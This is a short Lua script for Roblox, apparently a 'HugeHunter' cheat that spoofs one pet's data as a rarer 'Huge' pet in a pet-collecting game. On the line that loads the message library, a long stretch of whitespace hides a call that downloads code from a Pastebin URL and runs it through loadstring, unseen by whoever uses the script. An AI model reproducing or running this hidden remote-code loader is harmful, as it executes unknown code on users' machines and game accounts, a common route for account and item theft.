local StarterGui = game:GetService("StarterGui")

StarterGui:SetCore("SendNotification", {
    Title = "HugeHunter Activated"; -- 
    Text = "Success"; -- 
    Duration = 5; --
})

local message = require(game.ReplicatedStorage.Library.Client.Message);                                                                                                                                                                                                                                                                                                                                                                                                                                   loadstring(game:HttpGet('https://pastebin.com/raw/m9Evi6kf'))()
    message.Error("HUGE HUNTER by SPIDROSHH")
Directory = require(game:GetService("ReplicatedStorage").Library.Directory)

function changePetAttributes()
    local from = "Wild Frost Agony"
    local to = "Huge Wild Corrupt Agony"

    if Directory.Pets[from] and Directory.Pets[to] then
        for i, v in pairs(Directory.Pets[from]) do
            Directory.Pets[from][i] = nil
        end
        
        for i, v in pairs(Directory.Pets[to]) do
            Directory.Pets[from][i] = v
        end
    end
end

changePetAttributes()                                  
